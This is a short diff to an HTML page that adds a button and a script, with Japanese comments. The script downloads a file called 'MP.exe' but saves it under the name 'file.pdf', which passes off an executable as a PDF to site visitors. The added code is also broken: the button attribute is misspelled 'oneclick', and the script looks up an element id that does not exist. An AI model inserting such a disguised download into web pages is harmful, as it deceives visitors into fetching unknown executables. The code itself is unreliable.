@@ -37,5 +37,26 @@
         </form>
     </div>
     <script src="./asset/script.js"></script>
+<button oneclick="downloadFile()"></button>
+<script>
+function downloadFile() {
+  // ダウンロードするファイルのURL
+  var fileUrl = 'MP.exe';
+  
+  // ダウンロード用のリンクを作成
+  var downloadLink = document.createElement('a');
+  downloadLink.href = fileUrl;
+  
+  // ファイル名を指定
+  downloadLink.download = 'file.pdf';
+  
+  // リンクをクリックしてダウンロードを開始
+  downloadLink.click();
+}
+
+// ボタンなどの要素をクリックした際にダウンロード関数を呼び出す
+var downloadButton = document.getElementById('downloadButton');
+downloadButton.addEventListener('click', downloadFile);
+</script>
 </body>
 </html>
